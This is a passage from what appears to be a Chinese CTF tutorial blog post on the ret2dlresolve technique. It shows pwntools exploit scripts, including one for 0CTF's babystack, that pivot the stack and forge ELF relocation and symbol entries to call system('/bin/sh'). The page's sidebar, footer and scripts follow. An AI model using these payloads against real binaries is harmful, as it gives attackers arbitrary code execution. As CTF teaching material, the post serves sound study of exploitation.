<span class="number">0x08048248</span>  <span class="comment"># readelf -S bof</span></span><br><span class="line">rel_plt = <span class="number">0x8048348</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">fake_write_addr = bss_stage + <span class="number">28</span></span><br><span class="line">fake_arg = fake_write_addr - rel_plt</span><br><span class="line">r_offset = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">align = <span class="number">0x10</span> - ((bss_stage + <span class="number">36</span> - dynsym) % <span class="number">16</span>) </span><br><span class="line">fake_sym_addr = bss_stage + <span class="number">36</span> + align <span class="comment"># 填充地址使其与dynsym的偏移16字节对齐（即两者的差值能被16整除），因为结构体sym的大小都是16字节</span></span><br><span class="line">r_info = ((((fake_sym_addr - dynsym)//<span class="number">16</span>) &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span>) <span class="comment"># 使其最低位为7，通过检测</span></span><br><span class="line">fake_write = flat(p32(r_offset), p32(r_info))</span><br><span class="line">fake_write_str_addr = bss_stage + <span class="number">36</span> + align + <span class="number">0x10</span></span><br><span class="line">fake_name = fake_write_str_addr - dynstr</span><br><span class="line">fake_sym = flat(p32(fake_name),p32(<span class="number">0</span>),p32(<span class="number">0</span>),p32(<span class="number">0x12</span>)) <span class="comment"># 0x4c就是st_name,0x12在IDA的symbol表可查到</span></span><br><span class="line">fake_write_str = <span class="string">b&#x27;system\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload2 = flat(<span class="string">b&#x27;AAAA&#x27;</span></span><br><span class="line">, p32(plt_0)</span><br><span class="line">, fake_arg</span><br><span class="line">, p32(ppp_ret) <span class="comment">#调用函数的返回地址</span></span><br><span class="line">, p32(bss_stage + <span class="number">80</span>) <span class="comment">#system的参数储存地址</span></span><br><span class="line">, p32(bss_stage + <span class="number">80</span>)</span><br><span class="line">, p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">, fake_write <span class="comment"># bss_stage + 28</span></span><br><span class="line">, <span class="string">b&#x27;A&#x27;</span> * align <span class="comment"># 用于对齐的填充</span></span><br><span class="line">, fake_sym <span class="comment"># bss_stage + 36 + align</span></span><br><span class="line">, fake_write_str <span class="comment"># 伪造出的字符串</span></span><br><span class="line">)</span><br><span class="line">payload2 += flat(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">80</span>-<span class="built_in">len</span>(payload2)) , cmd + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += flat(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">100</span>-<span class="built_in">len</span>(payload2)))</span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>在用0CTF的babystack来试一下</p>
+<p>伪代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  alarm(<span class="number">0xAu</span>);</span><br><span class="line">  sub_804843B();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">sub_804843B</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x40u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于溢出长度不够，我们还要利用一下栈迁移。</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"> </span><br><span class="line">p=process(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">read_plt=<span class="number">0x8048300</span></span><br><span class="line">read_got=<span class="number">0x804A00C</span></span><br><span class="line">bss_addr=<span class="number">0x804A000</span>  <span class="comment"># readelf -S babystack | grep &quot;.bss&quot;</span></span><br><span class="line">pop_ebp_ret=<span class="number">0x080484eb</span> <span class="comment">#ROPgadget --binary babystack --only &quot;pop|ret&quot;</span></span><br><span class="line">leave_ret=<span class="number">0x080483a8</span> <span class="comment"># ROPgadget --binary babystack --only &quot;leave|ret&quot;</span></span><br><span class="line">bss_stage=bss_addr+<span class="number">0x800</span>   </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p32(bss_stage)</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)<span class="comment">#read的三个参数</span></span><br><span class="line">payload += p32(bss_stage)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0=<span class="number">0x080482f0</span>   <span class="comment">#objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x80482b0</span></span><br><span class="line">dynsym = <span class="number">0x80481cc</span></span><br><span class="line">dynstr = <span class="number">0x804822c</span></span><br><span class="line">fake_read_addr = bss_stage + <span class="number">28</span></span><br><span class="line">fake_arg = fake_read_addr - rel_plt</span><br><span class="line">r_offset = <span class="number">0x804A00C</span><span class="comment">#elf.got[&#x27;read&#x27;]</span></span><br><span class="line"></span><br><span class="line">align = <span class="number">0x10</span> - ((bss_stage + <span class="number">36</span> - dynsym) % <span class="number">16</span>) </span><br><span class="line">fake_sym_addr = bss_stage + <span class="number">36</span> + align</span><br><span class="line">r_info = ((((fake_sym_addr - dynsym)//<span class="number">16</span>) &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span>)</span><br><span class="line">fake_read_rel = p32(r_offset)+p32(r_info)</span><br><span class="line">fake_read_str_addr = bss_stage + <span class="number">36</span> + align + <span class="number">0x10</span></span><br><span class="line">fake_name = fake_read_str_addr - dynstr</span><br><span class="line">fake_sym =  p32(fake_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line">fake_read_str = <span class="string">b&#x27;system\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;AAAA&#x27;</span></span><br><span class="line">payload2+=p32(plt_0)</span><br><span class="line">payload2+=p32(fake_arg)</span><br><span class="line">payload2+=<span class="string">b&#x27;aaaa&#x27;</span>  <span class="comment">#覆盖调用函数的返回地址</span></span><br><span class="line">payload2+=p32(bss_stage + <span class="number">80</span>) <span class="comment">#system的参数所在地址</span></span><br><span class="line">payload2+=<span class="string">b&#x27;aaaa&#x27;</span></span><br><span class="line">payload2+=<span class="string">b&#x27;aaaa&#x27;</span></span><br><span class="line">payload2+=fake_read_rel <span class="comment"># bss_stage + 28</span></span><br><span class="line">payload2+=<span class="string">b&#x27;A&#x27;</span> * align <span class="comment"># 用于对齐的填充</span></span><br><span class="line">payload2+=fake_sym <span class="comment"># bss_stage + 36 + align</span></span><br><span class="line">payload2+=fake_read_str <span class="comment"># 伪造出的字符串</span></span><br><span class="line">payload2 += flat(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">80</span>-<span class="built_in">len</span>(payload2)) , cmd + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += flat(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">100</span>-<span class="built_in">len</span>(payload2)))</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17612">从0-1详解剖析ret2dlresolve-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/37572651">新手向]ret2dl-resolve详解 - 知乎</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pwnfeifei/p/15701859.html">ret2dl_resolve - 狒猩橙 - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51868336/article/details/114644569">ret2dlresolve超详细教程(x86&amp;x64)-CSDN博客</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>linkpwn
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://linkpwn.github.io/2025/11/02/ret2dlresolve/" title="ret2dlresolve">http://linkpwn.github.io/2025/11/02/ret2dlresolve/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/09/26/AI%E5%AE%89%E5%85%A8/" rel="prev" title="AI安全">
+      <i class="fa fa-chevron-left"></i> AI安全
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/11/05/%E5%93%B2%E5%AD%A6%E5%AE%B6%E5%B0%B1%E9%A4%90%E9%97%AE%E9%A2%98/" rel="next" title="哲学家就餐问题">
+      哲学家就餐问题 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ELF%E7%9A%84%E5%8A%A8%E6%80%81%E8%A7%A3%E6%9E%90"><span class="nav-number">2.1.</span> <span class="nav-text">ELF的动态解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GOT-%E5%92%8C-PLT-%E6%9C%BA%E5%88%B6"><span class="nav-number">2.2.</span> <span class="nav-text">GOT 和 PLT 机制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PLT%E8%A1%A8%EF%BC%88%E5%87%BD%E6%95%B0%E8%B7%B3%E6%9D%BF%EF%BC%89"><span class="nav-number">2.2.1.</span> <span class="nav-text">PLT表（函数跳板）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GOT%E8%A1%A8"><span class="nav-number">2.2.2.</span> <span class="nav-text">GOT表</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9C%9F%E6%AD%A3%E8%B4%9F%E8%B4%A3%E8%A7%A3%E6%9E%90%E7%9A%84%E5%87%BD%E6%95%B0-dl-runtime-resolve"><span class="nav-number">2.3.</span> <span class="nav-text">真正负责解析的函数_dl_runtime_resolve</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#resolver%E7%AC%AC%E4%B8%80%E4%BB%B6%E4%BA%8B%EF%BC%9A%E6%8B%BF-reloc-index"><span class="nav-number">2.4.</span> <span class="nav-text">resolver第一件事：拿 reloc_index</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%96-r-offset-%E5%92%8C-r-info"><span class="nav-number">2.5.</span> <span class="nav-text">取 r_offset 和 r_info</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5-r-info-%E7%B1%BB%E5%9E%8B"><span class="nav-number">2.6.</span> <span class="nav-text">检查 r_info 类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87-r-info-%E6%89%BE-dynsym"><span class="nav-number">2.7.</span> <span class="nav-text">通过 r_info 找 dynsym</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dynsym%E7%BB%93%E6%9E%84"><span class="nav-number">2.8.</span> <span class="nav-text">dynsym结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87-st-name-%E6%89%BE%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">2.9.</span> <span class="nav-text">通过 st_name 找字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%99%E9%87%8C%E8%A1%A5%E5%85%85%E4%B8%80%E4%B8%8Blink-map%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="nav-number">2.10.</span> <span class="nav-text">这里补充一下link_map的作用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#link-map%E7%BB%93%E6%9E%84%E6%9C%AC%E8%B4%A8"><span class="nav-number">2.10.1.</span> <span class="nav-text">link_map结构本质</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2dlresolve"><span class="nav-number">3.</span> <span class="nav-text">ret2dlresolve</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5"><span class="nav-number">3.1.</span> <span class="nav-text">第一步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5"><span class="nav-number">3.2.</span> <span class="nav-text">第二步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5"><span class="nav-number">3.3.</span> <span class="nav-text">第三步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5"><span class="nav-number">3.4.</span> <span class="nav-text">第四步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5"><span class="nav-number">3.5.</span> <span class="nav-text">第五步</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">4.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="linkpwn"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">linkpwn</p>
+  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">81</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">48</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/linkpwn" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:dkj20060328@qq.com" title="E-Mail → mailto:dkj20060328@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/linkpwn" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1827600686&auto=1&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">linkpwn</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/clickshowtext.js"></script>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
